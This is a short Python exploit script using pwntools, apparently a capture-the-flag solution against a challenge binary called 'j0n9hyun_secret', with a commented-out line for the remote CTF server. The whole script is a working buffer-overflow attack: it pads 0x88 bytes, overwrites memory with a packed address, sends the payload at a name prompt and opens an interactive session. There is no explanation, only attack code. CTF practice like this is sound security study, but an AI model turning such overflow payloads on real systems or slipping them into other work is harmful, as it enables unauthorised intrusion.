from pwn import *

#p = remote('ctf.j0n9hyun.xyz', 3031)
p = process('./j0n9hyun_secret')

context.log_level="debug"

payload = 'a' * 0x88 + p64(0x06CD478)
payload += 'a' * (312 - len(payload))


p.sendlineafter('input name: ', payload)

p.interactive()
